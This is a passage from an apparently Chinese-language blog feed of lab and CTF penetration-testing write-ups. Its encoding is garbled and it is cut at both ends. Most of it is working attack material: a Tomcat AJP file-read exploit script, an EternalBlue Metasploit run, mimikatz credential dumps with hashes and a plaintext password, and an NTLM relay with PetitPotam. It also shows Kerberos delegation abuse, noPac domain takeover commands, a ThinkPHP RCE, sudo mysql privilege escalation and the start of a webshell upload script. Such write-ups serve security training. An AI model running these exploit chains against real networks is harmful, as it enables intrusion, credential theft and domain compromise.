class="string">&#x27;en-US,en;q=0.5&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">fr.is_ssl = <span class="literal">False</span></span><br><span class="line">fr.attributes = []</span><br><span class="line"><span class="keyword">return</span> fr</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Tomcat</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, target_host, target_port</span>):</span><br><span class="line">self.target_host = target_host</span><br><span class="line">self.target_port = target_port</span><br><span class="line"></span><br><span class="line">self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">self.socket.connect((target_host, target_port))</span><br><span class="line">self.stream = self.socket.makefile(<span class="string">&quot;rb&quot;</span>, bufsize=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">perform_request</span>(<span class="params">self, req_uri, headers=&#123;&#125;, method=<span class="string">&#x27;GET&#x27;</span>, user=<span class="literal">None</span>, password=<span class="literal">None</span>, attributes=[]</span>):</span><br><span class="line">self.req_uri = req_uri</span><br><span class="line">self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Getting resource at ajp13://%s:%d%s&quot;</span> % (self.target_host, self.target_port, req_uri))</span><br><span class="line"><span class="keyword">if</span> user <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> password <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">self.forward_request.request_headers[<span class="string">&#x27;SC_REQ_AUTHORIZATION&#x27;</span>] = <span class="string">&quot;Basic &quot;</span> + (<span class="string">&quot;%s:%s&quot;</span> % (user, password)).encode(<span class="string">&#x27;base64&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> headers:</span><br><span class="line">self.forward_request.request_headers[h] = headers[h]</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> attributes:</span><br><span class="line">self.forward_request.attributes.append(a)</span><br><span class="line">responses = self.forward_request.send_and_receive(self.socket, self.stream)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(responses) == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">snd_hdrs_res = responses[<span class="number">0</span>]</span><br><span class="line">data_res = responses[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(data_res) == <span class="number">0</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;No data in response. Headers:%s\n&quot;</span> % snd_hdrs_res.response_headers)</span><br><span class="line"><span class="keyword">return</span> snd_hdrs_res, data_res</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">javax.servlet.include.request_uri</span></span><br><span class="line"><span class="string">javax.servlet.include.path_info</span></span><br><span class="line"><span class="string">javax.servlet.include.servlet_path</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;target&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Hostname or IP to attack&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">8009</span>, <span class="built_in">help</span>=<span class="string">&quot;AJP port to attack (default is 8009)&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="string">&#x27;--file&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&#x27;WEB-INF/web.xml&#x27;</span>, <span class="built_in">help</span>=<span class="string">&quot;file path :(WEB-INF/web.xml)&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">t = Tomcat(args.target, args.port)</span><br><span class="line">_,data = t.perform_request(<span class="string">&#x27;/asdf.jsp&#x27;</span>,attributes=[</span><br><span class="line">    &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;req_attribute&#x27;</span>,<span class="string">&#x27;value&#x27;</span>:[<span class="string">&#x27;javax.servlet.include.request_uri&#x27;</span>,<span class="string">&#x27;/&#x27;</span>]&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;req_attribute&#x27;</span>,<span class="string">&#x27;value&#x27;</span>:[<span class="string">&#x27;javax.servlet.include.path_info&#x27;</span>,args.file]&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;req_attribute&#x27;</span>,<span class="string">&#x27;value&#x27;</span>:[<span class="string">&#x27;javax.servlet.include.servlet_path&#x27;</span>,<span class="string">&#x27;/&#x27;</span>]&#125;,</span><br><span class="line">    ])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----------------------------&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([d.data <span class="keyword">for</span> d <span class="keyword">in</span> data]))</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°shellå‘ç°ç›´æ¥æ˜¯rootæƒé™ï¼Œè¯»å–flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /r*/f*/f*</span><br></pre></td></tr></table></figure><h2 id="flag02">flag02</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">./fs -h 172.22.11.1/24 -o result.txt</span><br><span class="line"></span><br><span class="line">172.22.11.45:445 open</span><br><span class="line">172.22.11.26:445 open</span><br><span class="line">172.22.11.6:445 open</span><br><span class="line">172.22.11.45:139 open</span><br><span class="line">172.22.11.26:139 open</span><br><span class="line">172.22.11.26:135 open</span><br><span class="line">172.22.11.45:135 open</span><br><span class="line">172.22.11.6:135 open</span><br><span class="line">172.22.11.76:8080 open</span><br><span class="line">172.22.11.6:88 open</span><br><span class="line">172.22.11.6:139 open</span><br><span class="line">172.22.11.76:8009 open</span><br><span class="line">172.22.11.76:22 open</span><br><span class="line">[*] NetBios: 172.22.11.6     [+]DC XIAORANG\XIAORANG-DC     </span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.11.6</span><br><span class="line">   [-&gt;]XIAORANG-DC</span><br><span class="line">   [-&gt;]172.22.11.6</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.11.26</span><br><span class="line">   [-&gt;]XR-LCM3AE8B</span><br><span class="line">   [-&gt;]172.22.11.26</span><br><span class="line">[*] NetBios: 172.22.11.45    XR-DESKTOP.xiaorang.lab             Windows Server 2008 R2 Enterprise 7601 Service Pack 1 </span><br><span class="line">[*] NetBios: 172.22.11.26    XIAORANG\XR-LCM3AE8B           </span><br><span class="line">[+] 172.22.11.45MS17-010(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span><br><span class="line">[*] WebTitle: http://172.22.11.76:8080  code:200 len:7091   title:åå°ç®¡ç†</span><br></pre></td></tr></table></figure><p>æ‰«å‡ºæ¥çš„ä¿¡æ¯å¹¶ä¸å¤šï¼Œå¯ä»¥å‘ç°6ï¼Œä¹Ÿå°±æ˜¯åŸŸæ§å¼€å¯äº†88ç«¯å£ï¼Œå¯èƒ½æ˜¯è¦æ‰“è¯ä¹¦ä¹‹ç±»çš„æ¼æ´ï¼Œå…¶æ¬¡æ˜¯æ‰«å‡ºæ¥ä¸€ä¸ªæ°¸æ’ä¹‹è“ï¼Œå…ˆæŠŠæ°¸æ’ä¹‹è“æ‰“äº†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="built_in">set</span> payload  payload/windows/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> rhosts 172.22.11.45</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>ç›´æ¥systemæƒé™ï¼Œæ‹¿åˆ°ç¬¬äºŒä¸ªflag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> C:/users/administrator/flag/flag02.txt</span><br></pre></td></tr></table></figure><h2 id="flag03">flag03</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure><p>å¾—åˆ°äº†æœºå™¨è´¦æˆ·å’Œyangmeiçš„å“ˆå¸Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Username     Domain    NTLM                              SHA1</span><br><span class="line">--------     ------    ----                              ----</span><br><span class="line">XR-DESKTOP$  XIAORANG  646f21852fb4de18e9cca504854c789e  86a8eea22535477e8d2426ab7d22afa099a441cf</span><br><span class="line">yangmei      XIAORANG  25e42ef4cc0ab6a8ff9e3edbbda91841  6b2838f81b57faed5d860adaf9401b0edb269a6f</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰yangmeiçš„æ˜æ–‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yangmei:xrihGHgoNZQ</span><br></pre></td></tr></table></figure><p>å‚è€ƒåšå®¢ï¼š<a href="https://whoamianony.top/posts/privilege-escalation-ntlmrelay2self-over-http-webdav/#ntlm-relay-over-http-webdav">https://whoamianony.top/posts/privilege-escalation-ntlmrelay2self-over-http-webdav/#ntlm-relay-over-http-webdav</a></p><p>ç®€å•æ¥è¯´è¿™é‡Œçš„ç‰¹åˆ«ä¹‹å¤„å°±æ˜¯ä½¿ç”¨httpåè®®æ¥ç»•è¿‡èº«ä»½éªŒè¯ï¼Œå…ˆæ‰«ä¸€ä¸‹è¿™é‡Œæ˜¯å¦å…·å¤‡åˆ©ç”¨æ¡ä»¶å§ï¼ˆå³å¼€å¯ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -d xiaorang.lab -M Webdav 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°åªæœ‰26å¼€å¯äº†webclientæœåŠ¡ï¼ŒåŸºæœ¬å¯ä»¥ç¡®å®šæ”»å‡»ç›®æ ‡å°±æ˜¯26è¿™å°æœºå™¨äº†</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240807014815684.png" alt="image-20240807014815684"></p><p>åé¢çš„æ€è·¯å°±æ˜¯åˆ©ç”¨æ¼æ´å¼ºåˆ¶è®©26è®¿é—®ä¸­ç»§ï¼Œè·å–å¯¹åº”çš„TGTï¼Œå†åˆ©ç”¨è·å–çš„TGTç”³è¯·STï¼Œè¿›è€Œå¯¹26æ¨ªå‘ã€‚</p><p>ä½†è¿™é‡Œå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œåšå®¢ä¸­åˆ©ç”¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-listen:8080,reuseaddr,fork tcp:192.168.2.148:80</span><br></pre></td></tr></table></figure><p>å°†è¢«æ§æœº8080ç«¯å£çš„æµé‡è½¬å‘åˆ°äº†192.168.2.148çš„80ç«¯å£ï¼Œè€Œæˆ‘ä»¬çš„kaliæ˜¯åœ¨å†…ç½‘ï¼Œæ²¡æ³•ç›´æ¥è½¬å‘è¿‡æ¥ï¼Œæ‰€ä»¥è§£å†³æ–¹æ³•æœ‰ä¸¤ä¸ª</p><p>1.ç›´æ¥åœ¨VPSä¸Šå¼€å¯ä¸­ç»§</p><p>2.å°†æœ¬åœ°kaliçš„ç«¯å£æ˜ å°„åˆ°VPSä¸Š</p><p>è¿™é‡Œç”±äºæˆ‘VPSçš„ç¯å¢ƒæ²¡é…ç½®ï¼Œæ‰€ä»¥å°±ä½¿ç”¨äº†ç¬¬äºŒç§æ–¹æ³•è§£å†³</p><p><strong>frpc.ini</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = vpsip</span><br><span class="line">server_port = 7099</span><br><span class="line"></span><br><span class="line">[plugin_socks6]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">remote_port = 8848</span><br><span class="line">local_port = 80</span><br><span class="line">local_ip = 127.0.0.1</span><br></pre></td></tr></table></figure><p><strong>frps.ini</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7099</span><br><span class="line"></span><br><span class="line">[tcp_1200]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">local_ip = 127.0.0.1 </span><br><span class="line">local_port = 8848</span><br></pre></td></tr></table></figure><p>è¢«æ§æœºå™¨ï¼šå°†æœ¬åœ°80ç«¯å£çš„æµé‡è½¬å‘åˆ°vpsçš„8848ç«¯å£</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-listen:80,reuseaddr,fork tcp:vpsip:8848</span><br></pre></td></tr></table></figure><p>æœ¬åœ°kaliï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure><p>VPSï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure><p>æ­å»ºå¥½äº†ä¹‹åå¯ä»¥ä¸Šæ‹¿ä¸‹çš„win7ä¸»æœºcurlä¸€ä¸‹ï¼Œçœ‹çœ‹æœ¬åœ°æ˜¯å¦èƒ½å¤Ÿæ”¶åˆ°å¯¹åº”æµé‡ï¼Œå¯ä»¥çœ‹åˆ°æœ¬åœ°ç¡®å®æ”¶åˆ°äº†å¯¹åº”æµé‡</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240807021733543.png" alt="image-20240807021733543"></p><p>1.kaliå¼€å¯ä¸­ç»§ç›‘å¬80</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-ntlmrelayx -t ldap://172.22.11.6 --no-dump --no-da --no-acl --escalate-user <span class="string">&#x27;xr-desktop$&#x27;</span> --delegate-access</span><br></pre></td></tr></table></figure><p>2.åˆ©ç”¨PetitPotamæ¼æ´å¼ºåˆ¶è®¿é—®76æœºå™¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python PetitPotam.py -u yangmei -p xrihGHgoNZQ -d xiaorang.lab ubuntu@80/webdav 172.22.11.26</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸­ç»§çš„ä½œç”¨å…¶å®å°±æ˜¯ä¿®æ”¹äº†æœºå™¨è´¦æˆ·çš„msDS-AllowedToActOnBehalfOfOtherIdentity</p><p>å…·ä½“å¯ä»¥å‚è€ƒè¿™é‡Œæ‰€è¯´çš„RBCDçš„ç¬¬ä¸‰ç§æ‰“æ³•ï¼š<a href="https://forum.butian.net/share/1591">https://forum.butian.net/share/1591</a></p><p>3.åˆ©ç”¨æœºå™¨è´¦æˆ·ç”³è¯·STç¥¨æ®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-getST -spn cifs/XR-LCM3AE8B.xiaorang.lab -impersonate administrator -hashes :646f21852fb4de18e9cca504854c789e  xiaorang.lab/XR-Desktop\$ -dc-ip 172.22.11.6</span><br></pre></td></tr></table></figure><p>4.å¯¼å…¥STç¥¨æ®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=administrator@cifs_XR-LCM3AE8B.xiaorang.lab@XIAORANG.LAB.ccache</span><br></pre></td></tr></table></figure><p>5.æ¨ªå‘26æœºå™¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -target-ip 172.22.11.26 -k XR-LCM3AE8B.xiaorang.lab -no-pass</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°ç¬¬ä¸‰ä¸ªflag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> C:\<span class="built_in">users</span>\administrator\flag\flag03.txt</span><br></pre></td></tr></table></figure><h2 id="flag04">flag04</h2><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240807035641925.png" alt="image-20240807035641925"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240807035927937.png" alt="image-20240807035927937"></p><p>å‘ç°å­˜åœ¨MA_Adminç»„ï¼Œå¯ä»¥æ·»åŠ è´¦æˆ·ï¼Œåˆ©ç”¨mimikatzæŠ“å–ä¸€æ³¢å“ˆå¸Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;&quot;</span>privilege::debug<span class="string">&quot;&quot;</span> <span class="string">&quot;&quot;</span>sekurlsa::logonpasswords<span class="string">&quot;&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[00000003] Primary</span><br><span class="line">       * Username : zhanghui</span><br><span class="line">       * Domain   : XIAORANG</span><br><span class="line">       * NTLM     : 1232126b24cdf8c9bd2f788a9d7c7ed1</span><br><span class="line">       * SHA1     : f3b66ff457185cdf5df6d0a085dd8935e226ba65</span><br><span class="line">       * DPAPI    : 4bfe751ae03dc1517cfb688adc506154</span><br></pre></td></tr></table></figure><p>å¾—åˆ°zhanghuiçš„å“ˆå¸Œï¼Œåˆ©ç”¨npacè·å–dcæƒé™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python noPac.py xiaorang.lab/zhanghui -hashes :1232126b24cdf8c9bd2f788a9d7c7ed1 -dc-ip 172.22.11.6 --impersonate Administrator -create-child -use-ldap -shell</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°flag04</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> C:\<span class="built_in">users</span>\administrator\flag\flag04.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>æ˜¥ç§‹äº‘å¢ƒ Initial</title>
    <link href="https://bowuchuling.github.io/posts/chunqiu_Initial.html"/>
    <id>https://bowuchuling.github.io/posts/chunqiu_Initial.html</id>
    <published>2024-08-20T15:21:54.627Z</published>
    <updated>2024-08-20T15:35:20.391Z</updated>
    
    <content type="html"><![CDATA[<h1>æ˜¥ç§‹äº‘å¢ƒ Initial</h1><h2 id="flag01">flag01</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">39.99.141.147:80 open</span><br><span class="line">39.99.141.147:22 open</span><br><span class="line">[*] alive ports len is: 2</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://39.99.141.147      code:200 len:5578   title:Bootstrap Material Admin</span><br><span class="line">[+] PocScan http://39.99.141.147 poc-yaml-thinkphp5023-method-rce poc1</span><br></pre></td></tr></table></figure><p>ç›´æ¥å°±æ‰«åˆ°tpçš„æ´äº†</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820155252858.png" alt="image-20240820155252858"></p><p>å‘ç°www-dataæƒé™</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820155528465.png" alt="image-20240820155528465"></p><p>åˆ©ç”¨mysqlææƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql -e <span class="string">&#x27;\! whoami&#x27;</span></span><br><span class="line"></span><br><span class="line">sudo mysql -e <span class="string">&#x27;\! cat /root/f*/f*&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="flag02">flag02</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.22.1.15  netmask 255.255.0.0  broadcast 172.22.255.255</span><br><span class="line">        inet6 fe80::216:3eff:fe26:a581  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 00:16:3e:26:a5:81  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 134555  bytes 188525088 (188.5 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 56675  bytes 12946270 (12.9 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.<span class="regexp">/fs -h 172.22.1.1/</span><span class="number">24</span> -o result.txt</span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">172.22.1.2:88 open</span><br><span class="line">172.22.1.21:139 open</span><br><span class="line">172.22.1.2:139 open</span><br><span class="line">172.22.1.21:135 open</span><br><span class="line">172.22.1.18:139 open</span><br><span class="line">172.22.1.18:80 open</span><br><span class="line">172.22.1.15:80 open</span><br><span class="line">172.22.1.2:135 open</span><br><span class="line">172.22.1.18:135 open</span><br><span class="line">172.22.1.15:22 open</span><br><span class="line">172.22.1.18:3306 open</span><br><span class="line">172.22.1.21:445 open</span><br><span class="line">172.22.1.2:445 open</span><br><span class="line">172.22.1.18:445 open</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.1.2</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.1.2</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.1.18</span><br><span class="line">   [-&gt;]XIAORANG-OA01</span><br><span class="line">   [-&gt;]172.22.1.18</span><br><span class="line">[*] WebTitle: http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.1.21</span><br><span class="line">   [-&gt;]XIAORANG-WIN7</span><br><span class="line">   [-&gt;]172.22.1.21</span><br><span class="line">[+] 172.22.1.21MS17-010(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span><br><span class="line">[*] NetBios: 172.22.1.2      [+]DC DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393 </span><br><span class="line">[*] 172.22.1.2  (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios: 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1 </span><br><span class="line">[*] NetBios: 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600 </span><br><span class="line">[*] WebTitle: http://172.22.1.18        code:302 len:0      title:None è·³è½¬url: http://172.22.1.18?m=login</span><br><span class="line">[*] WebTitle: http://172.22.1.18?m=login code:200 len:4012   title:ä¿¡å‘¼ååŒåŠå…¬ç³»ç»Ÿ</span><br><span class="line">[+] http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1</span><br></pre></td></tr></table></figure><p>æ­å»ºä»£ç†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gost -L=:10000 &amp;</span><br></pre></td></tr></table></figure><p>å…ˆçœ‹çœ‹è¿™ä¸ªä¿¡å‘¼oaï¼Œæœ‰å¼±å£ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin/admin123</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨åå°æ¼æ´ä¸Šä¼ shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.phpä¸ºwebshell</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># éœ€è¦ä¿®æ”¹ä»¥ä¸‹å†…å®¹ï¼š</span></span><br><span class="line"><span class="comment"># url_pre = &#x27;http://&lt;IP&gt;/&#x27;</span></span><br><span class="line"><span class="comment"># &#x27;adminuser&#x27;: 